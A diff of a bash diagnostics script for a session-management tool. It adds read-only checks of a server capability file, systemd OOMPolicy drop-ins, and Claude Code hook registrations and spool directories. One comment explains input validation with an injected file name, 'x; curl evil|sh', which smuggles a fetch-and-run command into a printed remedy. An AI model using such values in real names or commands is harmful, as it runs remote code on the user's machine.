@@ -185,7 +185,7 @@ CCRC_DOCTOR_CHECKS=(
   linger
   path
   services
-  scopes scope-sweep   # one line, as `flock timeout`: _check_scope-sweep is at the END of this file
+  scopes scope-sweep oom-policy   # one line, as `flock timeout`: _check_scope-sweep and _check_oom-policy are near the END of this file, before _check_delegation-hooks
   config
   auth box-token   # one line, as `flock timeout`: _check_box-token is at the END of this file
   rc
@@ -203,7 +203,7 @@ CCRC_DOCTOR_CHECKS=(
   pools
   pool-sync
   transcripts
-  update-sync
+  update-sync server-caps approval-verifier-runnable approval-key approval-key-colocated approval-digest-mismatch   # one line, as `flock timeout`: _check_server-caps is APPENDED near the end of this file, just before _check_oom-policy; the four approval checks are at the very END
   graphify
   graphify-path
   build
@@ -211,7 +211,7 @@ CCRC_DOCTOR_CHECKS=(
   fleet
   memory
   routing model-default   # one line, as `flock timeout` above; _check_model-default is at the END of this file
-  models codex docs history docs-sw   # five entries on one line: every line below is cited by number elsewhere
+  models codex docs history delegation-hooks update-sweep docs-sw   # seven entries on one line: every line below is cited by number elsewhere; docs-sw stays LAST (M7.6); _check_delegation-hooks and then _check_update-sweep are at the END of this file
 )
 
 # ── verdict helpers ───────────────────────────────────────────────────────
@@ -3764,8 +3764,8 @@ _check_pools() {
     # this check's whole value is that what it prints can be trusted, and a
     # tag file named `x; curl evil|sh` rendered `remedy: clear each: ccd
     # project-pool --project x; curl evil|sh --clear`. The charset is
-    # `_ws_project_valid`'s own (`ccd:3685`, `^[A-Za-z0-9._-]+$`, no
-    # dot-leading), so no name `ccd` would ever CREATE is omitted — a
+    # `_ws_project_valid`'s own (grep `_ws_project_valid`, `^[A-Za-z0-9._-]+$`,
+    # no dot- or dash-leading), so no name `ccd` would ever CREATE is omitted — a
     # cross-file claim, and `pool-name-parity.test.ts` measures it rather than
     # trusting this sentence. A leading `-` is refused too: it is shell-safe
     # but would be read by `ccd` as a flag, not as the project.
@@ -6560,11 +6560,11 @@ _dr_codex_usage_surplus_rows() {   # <_dr_codex_usage_surplus's rc> -> WARN find
 #
 # THE POPULATION is the roster's `exec.kind == "codex"` rows, read by the lane
 # library's ONE reader of that question (`_codex_lanes`, ccd/ccrc) — never
-# accounts.sh's telemetry-keyed CCRC_CODEX_BACKEND, which names the EXTERNAL
-# lanes another repository runs — plus any lane directory left under
-# `_codex_lane_dir` for an id the roster no longer calls codex: a flip back to
-# another launcher keeps that state on purpose, and it is WARNed, never
-# silently skipped (D-3713).
+# accounts.sh's telemetry-keyed CCRC_CODEX_BACKEND, which names any
+# EXTERNAL lane reporting codex usage (another repository's did; retired by
+# Plan 4) — plus any lane directory left under `_codex_lane_dir` for an id
+# the roster no longer calls codex: a flip back to another launcher keeps
+# that state on purpose, and it is WARNed, never silently skipped (D-3713).
 #   - role `server`: SKIP, a server box converges nothing per account
 #     (D-3111). CCRC_ROLE unset or unreadable reads as NOT server, as
 #     `cmd_update` reads it.
@@ -8617,4 +8617,851 @@ _check_docs-sw() {
     return 1
   fi
   _dr_pass docs-sw "$sw keeps $p on the app shell: its one denylist holds $k entries ($list), none of them $p or under it"
+}
+
+# ── server-caps: the server's capability words reach this box's hook ─────
+# (D-5232's mechanism; plan 2026-10-16 Task 9b; spec §6.1.) A session hook arm
+# that changes what an existing hookstate field means engages only while
+# `~/.ccrc/server-caps` is whole, at most SERVER_CAPS_LEASE_S (180 s, shared/
+# api.ts) old by this box's clock, not in the future, and lists the arm's word;
+# otherwise the hook writes what it always wrote. This check reads the file
+# READ-ONLY with that grammar (`at <1-11 digits>`, `caps` and zero or more words
+# of `[a-z0-9-]{1,64}`, `end`, each line newline-terminated) and names its
+# writer when it is not current: `ccd-update-sync` on a `fleet` node, this
+# box's own server process on a `both` node. A `server` node runs no hook; a
+# box with no recorded role arms no writer by configuration. Both SKIP.
+# Appended near the END of this file: lines above are cited by number elsewhere.
+_check_server-caps() {
+  local LC_ALL=C
+  local role="" f="$HOME/.ccrc/server-caps" writer remedy why="" lease=180 writer_unit=""
+  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
+  case "$role" in
+    server)
+      _dr_skip server-caps "this box records CCRC_ROLE=server, so it hosts no sessions and runs no session hook to gate"
+      return 3 ;;
+    fleet)
+      writer_unit=ccd-update-sync.timer
+      if [ ! -f "$CCRC_UNIT_DIR/$(_dr_unit_file "$writer_unit")" ]; then
+        _dr_skip server-caps "ccd-update-sync.timer is not installed on this box, so nothing here records the server's words and the session hook's gated arms stay off (only a --role fleet install places it, and macOS ships no systemd timer)"
+        return 3
+      fi
+      writer="ccd-update-sync (it asks the server's /health every minute)"
+      remedy="run systemctl --user start ccd-update-sync.service and read its log ($(_dr_log_hint ccd-update-sync.service)); the server CCRC_SERVER_URL names in ~/.ccrc/agent.env must answer /health" ;;
+    both)
+      writer_unit=ccrc.service
+      writer="this box's own ccrc server (it rewrites the file every minute)"
+      remedy="$(_dr_restart_hint ccrc.service), then read its log for 'could not write ~/.ccrc/server-caps'" ;;
+    *)
+      # No recorded role: a server here derives its role (config.ts deriveRole), `both` on a local fleet, and then
+      # writes the file every minute, so a file that exists is read as on a `both` node. With none, the gated arms
+      # are off (the hook writes what it always wrote), which is the safe state, and nothing here is wrong.
+      if [ ! -e "$f" ] && [ ! -L "$f" ]; then
+        _dr_skip server-caps "this box records no CCRC_ROLE and has no ~/.ccrc/server-caps, so the session hook's gated arms are off here; a ccrc server on this box would derive the role both and write the file every minute, and on a fleet node ccd-update-sync writes it once CCRC_ROLE=fleet is recorded"
+        return 3
+      fi
+      writer="this box's own ccrc server (role derived both), if one runs here"
+      remedy="record CCRC_ROLE in the box env file; if this box runs the ccrc server, $(_dr_restart_hint ccrc.service) and read its log for 'could not write ~/.ccrc/server-caps'" ;;
+  esac
+  local -a lines=()
+  local ln="" at="" words="" now
+  local re_at='^at ([0-9]{1,11})$' re_caps='^caps(( [a-z0-9-]{1,64})*)$'
+  if [ ! -e "$f" ] && [ ! -L "$f" ]; then
+    why="absent"
+    # FIRST WRITE PENDING (D-4168's fresh-install ruling, as `history`'s first-tick-pending): within one lease of the
+    # writer's unit file landing, an absent file is a writer that has not had its first beat yet, not a fault, and
+    # absence is already the safe state (the hook writes what it always wrote). Only ABSENCE gets the grace: a file
+    # that exists and is torn, malformed, stale or future was written and is wrong, so it WARNs at any age.
+    local unit_mtime unit_age
+    if [ -n "$writer_unit" ] && [ -f "$CCRC_UNIT_DIR/$(_dr_unit_file "$writer_unit")" ]; then
+      unit_mtime="$(_plat_mtime "$CCRC_UNIT_DIR/$(_dr_unit_file "$writer_unit")" 2>/dev/null)"
+      if [[ "$unit_mtime" =~ ^[0-9]+$ ]]; then
+        unit_age=$(($(date +%s) - unit_mtime))
+        if [ "$unit_age" -ge 0 ] && [ "$unit_age" -lt "$lease" ]; then
+          _dr_pass server-caps "first-write-pending: $writer_unit was installed ${unit_age}s ago and ~/.ccrc/server-caps has not been written yet, so the session hook's gated arms are off (the safe state) until $writer writes it, within ${lease}s"
+          return 0
+        fi
+      fi
+    fi
+  elif [ ! -f "$f" ] || [ ! -r "$f" ]; then
+    why="unreadable"
+  else
+    while IFS= read -r ln; do lines+=("$ln"); done < "$f"
+    # `ln` now holds what followed the last newline ('' in a whole document).
+    if [ "${#lines[@]}" -gt 3 ] || { [ "${#lines[@]}" -eq 3 ] && [ -n "$ln" ]; }; then
+      why="malformed (more than its three lines)"
+    elif [ "${#lines[@]}" -ge 1 ] && [[ ! ${lines[0]} =~ $re_at ]]; then
+      why="malformed (its first line is not at <unix seconds>)"
+    elif [ "${#lines[@]}" -ge 2 ] && [[ ! ${lines[1]} =~ $re_caps ]]; then
+      why="malformed (its second line is not caps followed by capability words)"
+    elif [ "${#lines[@]}" -ge 3 ] && [ "${lines[2]}" != end ]; then
+      why="malformed (its third line is not end)"
+    elif [ "${#lines[@]}" -lt 3 ]; then
+      why="torn (no end line: a write cut short)"
+    else
+      [[ ${lines[0]} =~ $re_at ]] && at="${BASH_REMATCH[1]}"
+      [[ ${lines[1]} =~ $re_caps ]] && words="${BASH_REMATCH[1]# }"
+      now="$(date +%s)"
+      at=$((10#$at))
+      if [ "$at" -gt "$now" ]; then
+        why="future (written at $at, $((at - now))s ahead of this box's clock)"
+      elif [ $((now - at)) -gt "$lease" ]; then
+        why="stale (written $((now - at))s ago, past its ${lease}s lease)"
+      fi
+    fi
+  fi
+  if [ -n "$why" ]; then
+    _dr_warn server-caps "~/.ccrc/server-caps is $why, so the session hook's gated arms are off on this box (it writes what it always wrote, which is safe) until $writer rewrites it" \
+      "$remedy"
+    return 2
+  fi
+  if [ -n "$words" ]; then
+    _dr_pass server-caps "~/.ccrc/server-caps is current (written $((now - at))s ago by $writer) and lists: $words"
+  else
+    _dr_pass server-caps "~/.ccrc/server-caps is current (written $((now - at))s ago by $writer) and lists no words, so the server advertises nothing and the hook's gated arms stay off"
+  fi
+  return 0
+}
+
+# ── oom-policy: the victim policy's two scope drop-ins (D-5241) ───────────
+# Spec 2026-10-16 §5.10. Under the user manager's default `OOMPolicy=stop`, one
+# OOM kill of any process in a pane scope makes systemd stop the whole scope,
+# the session with it, and one in `ccrc-tmux-server.scope` stops every pane on
+# the box. The install spine places two `OOMPolicy=continue` drop-ins; this
+# check reads that they are on disk AND that systemd applied them: it asks
+# `OOMPolicy` of `ccrc-tmux-server.scope` and of ONE live `tmux-spawn-*.scope`
+# (a `daemon-reload` reaches running scopes, plan Task 13 step 5, so any live
+# pane scope speaks for all of them). READ-ONLY: `list-units` and `show`, never
+# `set-property` (refused at runtime on this systemd anyway, step 5).
+#
+# A scope is asked only while it is LISTED: `systemctl show` of a unit that is
+# not loaded answers the manager's default, which would read as a missing
+# drop-in on a box that merely has no tmux server up. WARN, never FAIL, for
+# `_check_scopes`' reason: `ccrc install` returns doctor's code.
+_check_oom-policy() {
+  if [ "${CCD_OS:-linux}" = darwin ]; then
+    _dr_skip oom-policy "OOMPolicy is a systemd mechanism, and this box runs launchd"
+    return 3
+  fi
+  if ! _have_systemctl; then
+    _dr_skip oom-policy "systemctl is not on PATH, so no scope's OOMPolicy can be read"
+    return 3
+  fi
+  local pane_d="$CCRC_UNIT_DIR/tmux-spawn-.scope.d/50-oom-continue.conf"
+  local srv_d="$CCRC_UNIT_DIR/ccrc-tmux-server.scope.d/50-oom-continue.conf"
+  local -a bad=() read_ok=()
+  local unit _rest pane="" srv="" v dropin
+  while read -r unit _rest; do
+    case "$unit" in tmux-spawn-*.scope) pane="$unit"; break ;; esac
+  done < <(systemctl --user list-units --no-legend 'tmux-spawn-*.scope' 2>/dev/null)
+  while read -r unit _rest; do
+    [ "$unit" = ccrc-tmux-server.scope ] && srv="$unit"
+  done < <(systemctl --user list-units --no-legend 'ccrc-tmux-server.scope' 2>/dev/null)
+  [ -f "$srv_d" ] || bad+=("${srv_d/#$HOME/\~} is missing")
+  [ -f "$pane_d" ] || bad+=("${pane_d/#$HOME/\~} is missing")
+  for unit in "$srv" "$pane"; do
+    [ -n "$unit" ] || continue
+    v="$(systemctl --user show "$unit" -p OOMPolicy --value 2>/dev/null || true)"
+    if [ "$v" = continue ]; then read_ok+=("$unit"); continue; fi
+    dropin="$pane_d"; [ "$unit" = ccrc-tmux-server.scope ] && dropin="$srv_d"
+    if [ -f "$dropin" ]; then
+      bad+=("$unit reads OOMPolicy=${v:-unknown} although ${dropin/#$HOME/\~} is in place (not reloaded)")
+    else
+      bad+=("$unit reads OOMPolicy=${v:-unknown}")
+    fi
+  done
+  if [ "${#bad[@]}" -gt 0 ]; then
+    _dr_warn oom-policy "$(_dr_join "${bad[@]}"): an OOM kill of one process can stop a whole pane (or, in the tmux server's scope, every pane)" \
+      "ccrc update (or ccrc install) places both drop-ins; then systemctl --user daemon-reload, which reaches running scopes too"
+    return 2
+  fi
+  if [ "${#read_ok[@]}" -eq 0 ]; then
+    _dr_pass oom-policy "both OOMPolicy=continue drop-ins are in place; no tmux scope is running to read"
+  else
+    local ok_txt="${read_ok[0]}"
+    [ "${#read_ok[@]}" -lt 2 ] || ok_txt+=" and ${read_ok[1]}"
+    _dr_pass oom-policy "both OOMPolicy=continue drop-ins are in place and $ok_txt read continue"
+  fi
+  return 0
+}
+
+# ── delegation-hooks: the hook registration and the owner spool directories ──
+# APPENDED HERE, with its table entry on `docs-sw`'s line, for `_check_timeout`'s reason: lines in this file are cited
+# by number from `ccrc`, the tests and the docs, and a function inserted mid-file would move every one of them.
+#
+# WHY IT IS A CHECK AT ALL (delegation broker wave 3, Task 14). The delegation spool is written by `ccd/session-hook.sh`
+# from a hook Claude Code runs only where `settings.json` REGISTERS it, and into a directory only ccd makes
+# (`_delegation_spool_dir`, at every spawn). A hook that is not registered, or a directory that is not there, loses the
+# evidence silently: the capability word `delegation-events-v1` says only that the grammar and the directories exist, so
+# the hook's registration is measured HERE, apart from it, on every rostered home. Hooks are evidence, never authority:
+# nothing in this check, or in what it reports, decides anything.
+#
+# WHAT IS MEASURED, in the order it is reported. FAIL, each with its own remedy because each is a different action:
+#   1. a registration that could not be READ (a settings.json that is unreadable, not JSON, EMPTY or holding more than one
+#      JSON document, not a regular file, or whose `hooks` is not an object; a home that exists and cannot be searched).
+#      Never read as absence, and an empty file never as a registration: "I could not look" and "it is not there" are
+#      fixed differently (a mode, versus the installer), and folding them is the overloaded null.
+#   2. a registration that is MISSING: a home (one that exists on this box) with no settings.json, or with an approved
+#      event that has no managed entry. Remedy: `ccrc doctor --fix` (`_fix_delegation-hooks`, below), which re-runs the
+#      SHIPPED installer and is not a second installer of its own. Also here: ccrc's OWN hook (`/session-hook.sh`)
+#      registered under `WorktreeCreate`/`WorktreeRemove`, which ccrc never registers; the installer's sweep removes it.
+#   3. an owner spool directory that cannot be USED: the registry, or the spool root (a link, or not a readable and
+#      searchable directory: reported whether or not a session is running, because ccd refuses it at the next spawn), or
+#      the owner directory of a running session (ccd and the hook both refuse a link). Never read as missing.
+# WARN: (a) a foreign `WorktreeCreate`/`WorktreeRemove` registration (ccrc never registers either: a registered hook for
+# either REPLACES Claude Code's own worktree handling, spec 2026-10-04 §3.1; the remedy is manual and doctor deletes
+# nothing); (b) a RUNNING session whose owner spool directory is absent (D-4651): ccd makes it only at a spawn
+# (`_spawn_start`), and a supervisor restart leaves a live pane alone (`KillMode=process`), so every session whose pane
+# predates this code has none until its next real spawn, the census backstops the evidence meanwhile, and nothing is
+# lost by waiting. The remedy says so, and names the one operation that observes it now: stop and start the session
+# through ccd, which resumes its conversation but ends an in-flight turn; (c) a session the service manager would not
+# answer for (its directory was not measured). A FAIL is never hidden behind a WARN: both print, FAIL lines first, and
+# the return code is the worst class printed.
+# SKIP: a `server`-role box (D-3111: it hosts no sessions and converges nothing per account), a box with no roster
+# (`wrappers` owns that), and a box none of whose rostered homes exist here (the installer `continue`s past those too).
+#
+# THE APPROVED EVENT SET IS THE INSTALLER'S OWN, read at run time out of `$CCRC_HERE/install-session-hooks.sh`: the
+# `EVENTS_JSON='[...]'` line, which the installer registers matcher-less, plus `PreToolUse`, the one event the installer
+# writes on its own line with matcher `*` (so it reaches Agent, Task, Workflow and Bash). Nothing here types the list;
+# the one name this check does type, `PreToolUse`, is pinned against the installer's text, and the test that runs the
+# REAL installer into a fixture home and expects PASS is the mechanism that keeps the two from drifting. `$CCRC_HERE`
+# is where the doctor file itself sits, which is the shipped tree's `ccd/` on a box (`_inst_tree` rsyncs it whole).
+#
+# THE REGISTRATION IS READ WITH jq (-s: slurped, so an empty file or two documents are counted, never passed over), ONCE
+# PER HOME, AND NEVER PRINTED. The "managed" test is the installer's own
+# (`contains("/session-hook.sh")` on a hook's command), spelled again because a doctor run cannot import it; PreToolUse
+# must carry matcher `*`, because an entry for one tool name does not reach the delegation tools. The settings file's
+# other keys (an `env` block can hold a token) and the hook commands never reach an output line: the lines name homes
+# and events only. No `jq` on PATH is a FAIL, not a pass over a file nobody read.
+#
+# NO MUTATION. The spool directory is measured with `-e`/`-d`/`-L`/`-r`/`-x` and never created, chmodded or removed;
+# a foreign entry is never edited; only the `--fix` arm writes, and it writes through the shipped installer.
+_dh_events() {   # -> the approved event names on stdout, one per line; rc 1 unreadable installer, rc 2 no list in it
+  local inst="$CCRC_HERE/install-session-hooks.sh" line="" found="" v e
+  [ -f "$inst" ] && [ -r "$inst" ] || return 1
+  while IFS= read -r line || [ -n "$line" ]; do
+    case "$line" in EVENTS_JSON=*) found="$line"; break ;; esac
+  done 2>/dev/null < "$inst"
+  [ -n "$found" ] || return 2
+  v="${found#EVENTS_JSON=}"
+  v="${v//[\'\"\[\] ]/}"
+  [ -n "$v" ] || return 2
+  local IFS=,
+  for e in $v; do
+    [[ "$e" =~ ^[A-Z][A-Za-z]+$ ]] || return 2
+    printf '%s\n' "$e"
+  done
+  printf '%s\n' PreToolUse
+}
+
+_check_delegation-hooks() {
+  local _srv_role=""
+  # `-f` BEFORE `-r` (D-3025); `${BOX_ENV_FILE:-}` because a test sources this file bare under `set -u`.
+  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
+  if [ "$_srv_role" = server ]; then
+    _dr_skip delegation-hooks "this box records CCRC_ROLE=server, so it hosts no sessions and no hook registration or spool directory on it is ccrc's concern"
+    return 3
+  fi
+  local roster="$HOME/.ccrc/accounts.json" rows rc
+  if [ ! -e "$roster" ] && [ ! -L "$roster" ]; then
+    _dr_skip delegation-hooks "no account roster at \$HOME/.ccrc/accounts.json — the 'wrappers' check owns that"
+    return 3
+  fi
+  if [ ! -f "$roster" ] || [ ! -r "$roster" ]; then
+    _dr_fail delegation-hooks "\$HOME/.ccrc/accounts.json exists but is not a readable regular file, so no rostered home can be named and none was measured" \
+      "fix its mode/ownership — check with: ls -l \$HOME/.ccrc/accounts.json"
+    return 1
+  fi
+  if ! command -v node >/dev/null 2>&1; then
+    _dr_fail delegation-hooks "node is not on PATH, so \$HOME/.ccrc/accounts.json cannot be read and no rostered home was measured" "install Node first — see the 'node' check above"
+    return 1
+  fi
+  rows="$(_skills_roster_rows "$roster")"; rc=$?
+  if [ "$rc" -ne 0 ]; then
+    _dr_fail delegation-hooks "\$HOME/.ccrc/accounts.json could not be read as a roster, so no rostered home can be named and none was measured" \
+      "restore it from a backup, or rebuild it from disk: ccrc adopt --out /tmp/accounts.json — the 'wrappers' check names what is wrong with it"
+    return 1
+  fi
+  if [ -z "$rows" ]; then
+    _dr_skip delegation-hooks "no usable account in \$HOME/.ccrc/accounts.json — the 'wrappers' check owns that"
+    return 3
+  fi
+  if ! command -v jq >/dev/null 2>&1; then
+    _dr_fail delegation-hooks "jq is not on PATH, so no settings.json could be read and no hook registration was measured" "install jq — see the 'jq' check above"
+    return 1
+  fi
+  local -a want=()
+  local ev ev_rc=0 want_json="" wl
+  wl="$(_dh_events)"; ev_rc=$?
+  if [ "$ev_rc" -ne 0 ]; then
+    if [ "$ev_rc" -eq 1 ]; then
+      _dr_fail delegation-hooks "the shipped tree has no install-session-hooks.sh, so the approved event set could not be read: expected it at $CCRC_HERE/install-session-hooks.sh" \
+        "run 'ccrc update' (or 'ccrc install' from a checkout) to place the shipped tree"
+    else
+      _dr_fail delegation-hooks "$CCRC_HERE/install-session-hooks.sh holds no EVENTS_JSON list in the shape this check reads, so the approved event set could not be read" \
+        "run 'ccrc update' to place a shipped tree whose installer and doctor agree"
+    fi
+    return 1
+  fi
+  while IFS= read -r ev; do
+    [ -n "$ev" ] || continue
+    want+=("$ev"); want_json+="${want_json:+,}\"$ev\""
+  done <<< "$wl"
+  want_json="[$want_json]"
+
+  local id suffix dir f homes=0 out line kind name why said why_not=""
+  local -a unread=() missing=() ownworktree=() foreign=() spool_bad=() spool_none=() spool_unasked=()
+  while IFS=$'\t' read -r id suffix; do
+    [ -n "$id" ] || continue
+    dir="$HOME/$suffix"
+    # ABSENT is the installer's `continue` (a roster account whose wrapper was never run on this box is ordinary); a
+    # link or a non-directory is something that IS there, and unreadable is never absent.
+    if [ ! -e "$dir" ] && [ ! -L "$dir" ]; then continue; fi
+    homes=$((homes + 1))
+    if [ ! -d "$dir" ] || [ ! -r "$dir" ] || [ ! -x "$dir" ]; then
+      unread+=("$id: config directory is not a readable directory"); continue
+    fi
+    f="$dir/settings.json"
+    if [ ! -e "$f" ] && [ ! -L "$f" ]; then
+      missing+=("$id: no settings.json"); continue
+    fi
+    if [ ! -f "$f" ]; then unread+=("$id: settings.json is not a regular file"); continue; fi
+    if [ ! -r "$f" ]; then unread+=("$id: settings.json is not readable"); continue; fi
+    out="$(jq -rs --argjson want "$want_json" '
+      def own: type == "object" and ((.hooks // []) | type == "array")
+        and any((.hooks // [])[]?; type == "object" and ((.command // "") | tostring | contains("/session-hook.sh")));
+      def managed($star): type == "array" and any(.[]?; own and (($star == null) or .matcher == $star));
+      # One word per HOOK of an entry list, not per entry (R55): "own" if its command names /session-hook.sh, else "other"
+      # (an entry with no hooks list, or a hook with no command, is "other": it is not the ccrc hook).
+      def cmds: .[]? | if type == "object" and ((.hooks // []) | type) == "array" and ((.hooks // []) | length) > 0
+        then (.hooks[] | if type == "object" and ((.command // "") | tostring | contains("/session-hook.sh")) then "own" else "other" end)
+        else "other" end;
+      if length != 1 then "DOCS"
+      elif (.[0] | type) != "object" then "SHAPE"
+      elif ((.[0].hooks // {}) | type) != "object" then "SHAPE"
+      else (.[0].hooks // {}) as $h
+        | ($want[] | select(. as $e | ($h[$e] | managed(if $e == "PreToolUse" then "*" else null end)) | not) | "MISSING\t" + .),
+          (("WorktreeCreate", "WorktreeRemove") as $e | ($h[$e] // []) as $a
+            | ([$a | cmds] as $c
+              | (if ($c | any(. == "own")) then "OWN\t" + $e else empty end),
+                (if ($a | type) != "array" or ($c | any(. == "other")) then "FOREIGN\t" + $e else empty end)))
+      end' "$f" 2>/dev/null)"; rc=$?
+    if [ "$rc" -ne 0 ]; then unread+=("$id: settings.json is not valid JSON"); continue; fi
+    if [ "$out" = DOCS ]; then unread+=("$id: settings.json is empty or holds more than one JSON document"); continue; fi
+    if [ "$out" = SHAPE ]; then unread+=("$id: settings.json does not hold hooks as an object"); continue; fi
+    local miss="" fgn="" own=""
+    while IFS=$'\t' read -r kind name; do
+      case "$kind" in
+        MISSING) miss="${miss:+$miss, }$name" ;;
+        FOREIGN) fgn="${fgn:+$fgn }$name" ;;
+        OWN) own="${own:+$own }$name" ;;
+      esac
+    done <<< "$out"
+    [ -z "$miss" ] || missing+=("$id: $miss")
+    [ -z "$own" ] || ownworktree+=("$id: $own")
+    [ -z "$fgn" ] || foreign+=("$id: $fgn")
+  done <<< "$rows"
+  if [ "$homes" -eq 0 ]; then
+    _dr_skip delegation-hooks "none of the roster's config directories exist on this box, so there is no hook registration to measure"
+    return 3
+  fi
+
+  # ── the owner spool directories ─────────────────────────────────────────────
+  # The spool ROOT is measured whether or not a session runs: a root that is a link, or not a readable and searchable
+  # directory, is a defect today, because ccd refuses it at the next spawn and the session then records nothing.
+  # An OWNER directory matters only for a RUNNING session: a registry row whose supervisor is not running owes nothing
+  # (its directory is made at its next spawn). The manager is asked ONLY about rows whose directory is not standing,
+  # and in ONE call (`is-active u1 u2 ...` prints one word per unit, in order), so a box full of parked rows that
+  # predate the spool code costs one fork per run, not one per row; a box whose every directory stands asks nothing.
+  # Its answer has three shapes, as `_check_routing`'s census and the codex lane's `_dr_cx_sessions` have them: live,
+  # measured not live, and NOT ASKED (the manager printed no word), which is its own WARN and never folded into either.
+  local reg="$HOME/.cc-sessions" sdir u sid rows_read=0 rows_ok=0 unasked=0 p state
+  local rd="${reg/#$HOME/\$HOME}"   # the registry as the operator reads it: $HOME unexpanded (and no second path literal in this file, pool-name-parity.test.ts)
+  local spool_root_bad="" l
+  if { [ -e "$reg" ] || [ -L "$reg" ]; } && { [ ! -d "$reg" ] || [ ! -r "$reg" ] || [ ! -x "$reg" ]; }; then
+    spool_bad+=("$rd is not a readable, searchable directory")
+  elif [ -d "$reg" ]; then
+    # The chain is checked once, top down, so an unsearchable root is ONE finding and never N missing owners.
+    for p in "$reg/delegation" "$reg/delegation/spool"; do
+      [ -n "$spool_root_bad" ] && break
+      if [ -L "$p" ]; then spool_root_bad="${p/#$HOME/\$HOME} is a symlink"
+      elif [ -e "$p" ] && { [ ! -d "$p" ] || [ ! -r "$p" ] || [ ! -x "$p" ]; }; then spool_root_bad="${p/#$HOME/\$HOME} is not a readable, searchable directory"
+      fi
+    done
+    local -a pending=() pending_why=() units=() answers=()
+    for u in "$reg"/*.uuid; do
+      { [ -e "$u" ] || [ -L "$u" ]; } || continue   # the unmatched glob's literal is no row; a dangling link is one
+      sid="${u##*/}"; sid="${sid%.uuid}"
+      rows_read=$((rows_read + 1))
+      [ -z "$spool_root_bad" ] || continue          # the root is already one finding for every row
+      sdir="$reg/delegation/spool/$sid"
+      if [ -d "$sdir" ] && [ ! -L "$sdir" ] && [ -r "$sdir" ] && [ -x "$sdir" ]; then
+        rows_ok=$((rows_ok + 1)); continue
+      fi
+      # Something is wrong with this row's directory; whether it MATTERS depends on the session being running.
+      if [ -L "$sdir" ]; then why_not="owner directory is a symlink"
+      elif [ ! -e "$sdir" ]; then why_not="missing"
+      else why_not="owner directory is not a readable, searchable directory"
+      fi
+      pending+=("$sid"); pending_why+=("$why_not"); units+=("claude-session@$sid.service")
+    done
+    [ -z "$spool_root_bad" ] || spool_bad+=("$spool_root_bad")
+    if [ "${#pending[@]}" -gt 0 ]; then
+      if [ "${CCD_OS:-linux}" = darwin ]; then
+        for sid in "${pending[@]}"; do answers+=("$(_svc_is_active "claude-session@$sid.service")"); done
+      else
+        said="$(systemctl --user is-active "${units[@]}" 2>/dev/null)" || :
+        if [ -n "$said" ]; then
+          while IFS= read -r l; do answers+=("$l"); done <<< "$said"
+        fi
+        # One word per unit, or the question was not answered: a short answer is never read as "not running".
+        if [ "${#answers[@]}" -ne "${#pending[@]}" ]; then answers=(); for sid in "${pending[@]}"; do answers+=(""); done; fi
+      fi
+    fi
+    local i
+    for i in "${!pending[@]}"; do
+      sid="${pending[$i]}"; why_not="${pending_why[$i]}"; state="${answers[$i]}"
+      case "$state" in
+        active|activating|reloading|refreshing|deactivating)
+          case "$why_not" in
+            missing) spool_none+=("$sid") ;;
+            *) spool_bad+=("$sid: $why_not") ;;
+          esac ;;
+        '') unasked=$((unasked + 1)); spool_unasked+=("$sid") ;;
+      esac
+    done
+  fi
+
+  # ── report: FAILs in a fixed order, then WARNs, then the worse class is the return code ──
+  local worst=0 n s
+  if [ "${#unread[@]}" -gt 0 ]; then
+    _dr_fail delegation-hooks "hook registration could not be read, so it is not known to be absent: $(_dr_join "${unread[@]}")" \
+      "fix what is named (check with: ls -l \$HOME/<home>/settings.json) — this is a mode or shape problem, not a missing registration, and doctor never prints the file"
+    worst=1
+  fi
+  if [ "${#missing[@]}" -gt 0 ]; then
+    n=${#missing[@]}; s=homes; [ "$n" -eq 1 ] && s=home
+    _dr_fail delegation-hooks "the shipped hook registration is missing from $n rostered $s: $(_dr_join "${missing[@]}")" \
+      "run 'ccrc doctor --fix' (it re-runs the shipped tree's install-session-hooks.sh into every rostered home), or 'ccrc update' (which re-places the tree and re-runs it)"
+    worst=1
+  fi
+  if [ "${#ownworktree[@]}" -gt 0 ]; then
+    _dr_fail delegation-hooks "ccrc's own session hook is registered under an event it never registers — a registered hook for WorktreeCreate or WorktreeRemove replaces Claude Code's own worktree handling: $(_dr_join "${ownworktree[@]}")" \
+      "run 'ccrc doctor --fix' (it removes ccrc's own entry from every event; an entry of its own that names another command is kept, but an entry shared with ccrc's hook is not, so --fix refuses a home that has one: move the other command into an entry of its own first)"
+    worst=1
+  fi
+  if [ "${#spool_bad[@]}" -gt 0 ]; then
+    _dr_fail delegation-hooks "the delegation spool could not be used, so it is not known to be absent: $(_dr_join "${spool_bad[@]}")" \
+      "fix what is named (check with: ls -ld $rd/delegation/spool) — a link is refused by ccd and by the hook, so look before moving it; doctor never creates or removes the directory"
+    worst=1
+  fi
+  if [ "${#foreign[@]}" -gt 0 ]; then
+    local kinds="" fl=" ${foreign[*]} " cnt=0
+    case "$fl" in *WorktreeCreate*) kinds="WorktreeCreate"; cnt=$((cnt + 1)) ;; esac
+    case "$fl" in *WorktreeRemove*) kinds="${kinds:+$kinds, }WorktreeRemove"; cnt=$((cnt + 1)) ;; esac
+    if [ "$cnt" -eq 1 ]; then
+      _dr_warn delegation-hooks "$kinds is registered, and ccrc never registers it — a registered hook for either event replaces Claude Code's own worktree handling: $(_dr_join "${foreign[@]}")" \
+        "inspect the entry by hand in that home's settings.json and remove it if it is not intended — doctor does not edit or delete it"
+    else
+      _dr_warn delegation-hooks "$kinds are registered, and ccrc never registers them — a registered hook for either event replaces Claude Code's own worktree handling: $(_dr_join "${foreign[@]}")" \
+        "inspect the entries by hand in those homes' settings.json and remove them if they are not intended — doctor does not edit or delete them"
+    fi
+    [ "$worst" -eq 1 ] || worst=2
+  fi
+  if [ "${#spool_none[@]}" -gt 0 ]; then
+    n=${#spool_none[@]}
+    local shown="" k=0 more=""
+    for sid in "${spool_none[@]}"; do
+      k=$((k + 1)); [ "$k" -le 5 ] && shown="${shown:+$shown }$sid"
+    done
+    [ "$n" -gt 5 ] && more=" (+$((n - 5)) more)"
+    s=sessions; [ "$n" -eq 1 ] && s=session
+    local who="$n running sessions have no delegation spool directory yet, so they are not observed until their next spawn (a swap or a respawn)"
+    [ "$n" -eq 1 ] && who="1 running session has no delegation spool directory yet, so it is not observed until its next spawn (a swap or a respawn)"
